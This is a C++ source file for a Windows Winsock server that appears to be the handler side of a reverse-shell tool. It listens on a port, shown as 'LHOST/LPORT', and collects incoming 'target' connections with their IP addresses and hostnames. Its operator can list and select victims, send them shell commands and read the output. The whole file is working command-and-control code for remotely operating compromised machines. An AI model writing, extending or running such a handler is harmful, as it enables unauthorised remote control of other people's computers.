#include "server.hpp"

const char* failed  = "\x1B[38;5;1m[-]\033[0m:";
const char* warn    = "\x1B[38;5;3m[!]\033[0m:";
const char* success = "\x1B[38;5;2m[+]\033[0m:";


void Server::handler_print_help() {
    printf("\x1B[38;5;8m========================================================\033[0m\n"
                "help\t\tShows this help\n"
                "list\t\tLists connected clients\n"
                "select\t\tSelects a client by its index\n"
                "exit|quit\tStops current connections with a client\n"
                "shutdown\tShuts server down\n"
    "\x1B[38;5;8m========================================================\033[0m");
}

void Server::initialize() {
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
    }
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    
    // Resolve the server address and port
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    lport_str = converter.to_bytes(lport);
    //printf("port: %s\n", lport_str.c_str());
    iResult = getaddrinfo(NULL, (PCSTR)lport_str.c_str(), &hints, &AddrInfo);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return;
    } 
    printf("\nAddr Info Found | ");
}


int Server::quit_gracefully() {
    for (auto conn : all_connections)
    {
        iResult = shutdown(conn, SD_SEND);
        if (iResult == SOCKET_ERROR) {
            printf("%s shutdown failed with error: %d\n", failed, WSAGetLastError());
            closesocket(conn);
            WSACleanup();
            return 0;
        }
        else { return 1; }
    } return 0;
}


void Server::create_socket() {
    // Create a SOCKET for connecting to server
    ListenSocket = WSASocketW(AddrInfo->ai_family, AddrInfo->ai_socktype, AddrInfo->ai_protocol, NULL, (unsigned)NULL, (unsigned)NULL);
    if (ListenSocket == INVALID_SOCKET) {
        printf("%s socket creation failed with error: %ld\n", failed, WSAGetLastError());
        freeaddrinfo(AddrInfo);
        WSACleanup();
        return;
    }
    int error_code;
    if (setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&error_code, sizeof(error_code)) == SOCKET_ERROR)
    {
        printf("%s Error Setting TCP SOcket Options! Error: %d\n", failed, WSAGetLastError());
        freeaddrinfo(AddrInfo);
        WSACleanup();
        return;
    }
    printf("Socket Created | ");
}


void Server::bind_socket() {
    // setup the TCP listening socket
    iResult = bind(ListenSocket, AddrInfo->ai_addr, (int)AddrInfo->ai_addrlen);
    listen(ListenSocket, SOMAXCONN);
    
    if (iResult == SOCKET_ERROR || iResult == INVALID_SOCKET) {
        printf("%s socket binding failed with error: %d\n", failed, WSAGetLastError());
        std::this_thread::sleep_for(std::chrono::seconds(10));
        bind_socket();
    }
    freeaddrinfo(AddrInfo); // clear AddrInfo, dont need anymore
    printf("Socket Bind | ");
}


void Server::accept_connections() {
    printf("Starting Handler Thread\n");
    // ^ ok not really shut up
    for (auto c : all_connections) {
        closesocket(c);
        WSACleanup();
    }
    all_connections.clear();
    all_addresses.clear();
    
    // get local ip
    hostent* localHost = gethostbyname("");
    char* localIP = inet_ntoa(*(struct in_addr*)*localHost->h_addr_list);
    // target ip and hostname vars with same receiving buffer size
    char TargetIP[BUFFER_SIZE];
    char TargetHostname[BUFFER_SIZE];
    // vector to hold array of index,ip,port,hostname
    std::vector<LPCSTR> address;
    // nice colors...
    printf("========================================================================\n"
           "Starting Listener -> \x1B[38;5;111mLHOST: \x1B[38;5;221m%s\033[0m | "
                                "\x1B[38;5;111mLPORT: \x1B[38;5;221m%ws\033[0m\n\n", localIP, lport.c_str());
    
    // loop indefinateley
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        try {
            ClientSocket = accept(ListenSocket, NULL, NULL);    // accept client sockets to server
            recv(ClientSocket, TargetIP, BUFFER_SIZE, 0);       // receive ip address
            recv(ClientSocket, TargetHostname, BUFFER_SIZE, 0); // receive hostname
            address.push_back((LPCSTR)TargetIP);                //ip - 0
            address.push_back((LPCSTR)lport_str.c_str());       //port - 1
            address.push_back((LPCSTR)TargetHostname);          //hostname - 2
        }
        catch (const std::exception&) { //if cant connect or client is offline
            printf("%s Error accepting connections: %d", failed, WSAGetLastError()); 
            WSACleanup(); //clean up, wait, then start over
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            continue;
        }
        // add client SOCKET and INFO to their vectors
        all_connections.push_back(ClientSocket);
        all_addresses.push_back(address);
        printf("\n\n%s Connection has been established: %s (%s)\n", success, address[2], address[0]);
        address.clear();
        // reprint handler line because input was interrupted
        printf("\n\x1B[38;5;159mhandler\x1B[38;2;231;72;86m> \033[0m");
    }
}

template <typename Out>
void split_string(const std::string& s, char delim, Out result) {
    std::istringstream iss(s);
    std::string item;
    while (std::getline(iss, item, delim)) {
        *result++ = item;
    }
}

std::vector<std::string> split(const std::string& s, char delim) {
    std::vector<std::string> elems;
    split_string(s, delim, std::back_inserter(elems));
    return elems;
}

void Server::start_handler() {
    std::string input; // hold stdIn
    std::vector<std::string> input_vec;
    
    while (true) {
        // handler>_ (looks messy because of ANSI escape codes
        printf("\n\x1B[38;5;159mhandler\x1B[38;2;231;72;86m> \033[0m");
        std::getline(std::cin, input); // take string input

        // using _stricmp because its not case specific and clean
        if (_stricmp(input.c_str(), "clear") == 0 ||
            _stricmp(input.c_str(), "cls") == 0)
        {   printf("\033[2J\033[1;1H");  } // another weird escape code thing

        // list all connections
        else if (_stricmp(input.c_str(), "list") == 0) {
            list_connections();
            continue;
        }

        // connect to new target
        else if (input.find("select") != std::string::npos) {
            unsigned short int index = 0;
            // just automatically select the first connection for now
            /*try {
                input_vec.clear(); input_vec = split(input, ' ');
                index = atoi(input_vec[1].c_str());
            }
            catch (const std::exception& e) {
                printf("%s Please connect to client via index. Error: %s\n", warn, e);
            }*/
            if (change_target(index)) {
                send_commands();
            } else { continue; }
        }

        // shutdown server
        else if (_stricmp(input.c_str(), "shutdown") == 0) {
            printf("server shutting down...\n");
            quit_gracefully();
            closesocket(ClientSocket);
            WSACleanup();
            break;
        }
        // print help menu
        else if (_stricmp(input.c_str(), "help") == 0) {
            handler_print_help();
        }
        // if nothing is entered just skip
        else if (input == "") {
            printf(""); //pass
        }
        // this means the dumbass didnt enter da right thing smh
        else {
            printf("Command not recognized");
        }
    }
}

void Server::list_connections() {
    // list all connections
    int error_code;
    int error_code_size = sizeof(error_code);
    std::ostringstream results; std::string list;

    
    for (std::size_t  i = 0; i < all_connections.size(); i++) {
        try {
            // check all elements in vector can communicate with the server
            getsockopt(all_connections[i], SOL_SOCKET, SO_ERROR, (char*)&error_code, &error_code_size);
        }
        catch (...) {
            // otherwise remove the disconnected ones so only the active will be printed for use
            all_connections.erase(all_connections.begin() + (i - 1));
            all_addresses.erase(all_addresses.begin() + (i - 1));
            continue;
        }
        results << "|\x1B[38;5;8m=======================================================\033[0m\n"
            << "| " << i << "\t | " << all_addresses[i][0] << "\t | "
            << all_addresses[i][1] << "\t | " << all_addresses[i][2] << '\n';
        list.append(results.str());
    }
    // just making it look pretty
    printf("\n/\x1B[38;5;8m=======================================================\033[0m\n");
    printf(              "| INDEX\t | IP-ADDRESS\t | PORT\t | HOSTNAME\n"                   );
    printf(                              (LPCSTR)list.c_str()                               );
    printf("\\\x1B[38;5;8m=======================================================\033[0m\n" );
}


bool Server::change_target(unsigned short int target) {
    try {
        ClientSocket = all_connections[target];
    }
    catch (...) {
        printf("%s Not a valid selection\n", warn);
        return false;
    }
    printf("%s You are now connected to %s\n", success, all_addresses[target][2]);
    printf("=============================="); // make seperator matching the length of of the text above
    for (std::size_t x = 0, length = std::string(all_addresses[target][2]).length(); x != length; ++x) 
    {   putchar('=');   } printf("\n\n");
    return true;
}


int Server::send_commands() {
    DWORD dwWrite, dwTotalWritten = 0;
    BOOL bSuccess = FALSE;
    bRunning = TRUE;
    std::wstring usrinput;
    while (bRunning)
    {
        // send command
        dwWrite, dwTotalWritten = 0;
        bSuccess = FALSE;
        ZeroMemory(&inputUser, sizeof(inputUser));
        fgets(inputUser, sizeof(inputUser), stdin);
        strtok(inputUser, "\n");
        DWORD sent = 0;
        while (sent < BUFFER_SIZE && (int)sent != SOCKET_ERROR)
        {
            sent += send(ClientSocket, inputUser + sent, BUFFER_SIZE - sent, 0);
            if ((int)sent == SOCKET_ERROR)
            {
                printf("socketerror\n");
                break;
            }
        }
        while (dwTotalWritten < dwSockRead)
        {
            bSuccess = WriteFile((HANDLE)ClientSocket, inputUser + dwTotalWritten, sizeof(inputUser) - dwTotalWritten,
                &dwWrite, NULL);
            if (!bSuccess) { break; }
            dwTotalWritten += dwWrite;
        }
        // reveive
        ZeroMemory(&rdata, sizeof(rdata));
        dwSockRead = recv(ClientSocket, rdata, BUFFER_SIZE, 0);
        if ((int)dwSockRead == SOCKET_ERROR)
        {
            printf("read error: %d", WSAGetLastError());
            bRunning = FALSE;
            return 0;
        }
        dwWrite, dwTotalWritten = 0;
        bSuccess = FALSE;

        // print to console
        const HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hStdOut != INVALID_HANDLE_VALUE)
        {
            while (dwTotalWritten < dwSockRead)
            {
                bSuccess = WriteFile(hStdOut, rdata + dwTotalWritten, dwSockRead - dwTotalWritten,
                    &dwWrite, NULL);
                if (!bSuccess) {
                    printf("could not print to console\n");
                    break;
                }
                dwTotalWritten += dwWrite;
            }
        }
    }
    shutdown(ClientSocket, SD_BOTH);
    closesocket(ClientSocket);
    all_connections.erase(all_connections.begin());
    all_addresses.erase(all_addresses.begin());
    return 0;
}
